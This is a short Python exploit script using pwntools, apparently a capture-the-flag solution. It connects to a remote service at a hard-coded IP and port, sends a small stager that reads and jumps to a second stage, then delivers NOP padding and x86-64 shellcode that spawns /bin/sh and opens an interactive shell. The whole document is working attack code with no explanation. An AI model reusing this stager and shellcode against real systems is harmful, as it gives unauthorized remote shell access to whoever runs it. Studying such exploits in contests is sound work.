from pwn import *
from sys import argv
from time import sleep

context.log_level = "INFO"

binfile = "./problem"

context.binary = binfile

elf = ELF(binfile)

p = remote("114.177.250.4", 2210)

payload = b""
payload += asm('''
mov rsp, rax
mov rsi, [rax]
mov rdx, 61
xor rax, rax
syscall
jmp rsi
''')

padding = b"\x90" * 0x20
shellcode = b""
shellcode += asm('''
xor rdx, rdx
push rdx
movabs rax, 0x68732f2f6e69622f
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
lea rax, [rdx+0x3b]
syscall
''')

p.recvuntil("Input your shellcode: ")
p.send(payload)
p.send(padding+shellcode)

p.interactive()
